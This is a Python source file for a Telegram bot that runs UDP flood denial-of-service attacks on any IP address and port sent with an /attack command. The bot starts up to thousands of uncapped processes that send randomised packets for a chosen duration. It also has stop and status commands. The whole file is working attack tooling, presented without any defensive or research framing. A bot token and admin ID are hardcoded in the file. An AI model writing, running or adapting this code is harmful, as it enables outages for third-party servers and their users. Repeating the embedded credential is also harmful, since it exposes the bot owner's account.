import logging
import socket
import time
import random
import multiprocessing as mp
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BOT CONFIG ====================
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185

active_attacks = {}
stop_flags = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 **PURE POWER MODE** - 5000 Threads Ready!")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚔️ **PURE POWER COMMANDS**\n\n"
        "`/attack <ip> <port> <duration> <threads>`\n"
        "Example: `/attack 8.8.8.8 53 60 5000`\n\n"
        "/stopattack - Emergency stop\n"
        "/status - Check active attacks",
        parse_mode='Markdown'
    )

def attack_worker(ip, port, duration, stop_event, worker_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)  # 8MB big buffer for power
        sock.setblocking(False)

        end_time = time.time() + duration
        packets = 0
        base_payload = b"PURE_POWER_ATTACK_" + str(worker_id).encode() + b"_"

        while time.time() < end_time and not stop_event.is_set():
            try:
                # Random aggressive size for maximum impact
                size = random.randint(600, 1472)
                payload = base_payload + random.randbytes(size - len(base_payload))
                sock.sendto(payload[:size], (ip, port))
                packets += 1

                # Minimal delay only when needed
                if packets % 1500 == 0:
                    time.sleep(0.00003)
            except BlockingIOError:
                time.sleep(0.0002)
            except:
                break

        sock.close()
        return packets
    except:
        return 0

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if len(context.args) < 4:
        await update.message.reply_text(
            "Usage: `/attack <ip> <port> <duration_seconds> <threads>`\n"
            "Example: `/attack 8.8.8.8 53 45 5000`",
            parse_mode='Markdown'
        )
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])
    threads = int(context.args[3])   # No cap - pure power as you asked

    attack_id = f"{ip}:{port}_{int(time.time())}"
    stop_event = mp.Event()
    stop_flags[attack_id] = stop_event

    await update.message.reply_text(
        f"⚔️ **PURE POWER ATTACK LAUNCHED**\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱ Duration: `{duration}` seconds\n"
        f"🧵 Threads/Processes: `{threads}` (Maximum Raw Power)",
        parse_mode='Markdown'
    )

    # Launch as many processes as you asked (5000 bhi chalega agar machine allow kare)
    pool = mp.Pool(processes=threads)
    results = []
    for i in range(threads):
        res = pool.apply_async(attack_worker, (ip, port, duration, stop_event, i))
        results.append(res)

    total_sent = 0
    for res in results:
        total_sent += res.get()

    pool.close()
    pool.join()

    await update.message.reply_text(
        f"✅ **Pure Power Attack Finished**\n"
        f"Target: `{ip}:{port}`\n"
        f"Threads used: `{threads}`\n"
        f"Total packets sent (approx): `{total_sent:,}`"
    )

async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    for ev in stop_flags.values():
        ev.set()
    await update.message.reply_text("🛑 **All attacks stopped!**")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    active = len([v for v in active_attacks.values() if v])
    await update.message.reply_text(f"📊 **Active Power Attacks**: `{active}`")

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stopattack", stop_attack_cmd))
    application.add_handler(CommandHandler("status", status))

    print("🔥 PURE POWER UDP Attack Bot Started - 5000 Threads Mode!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
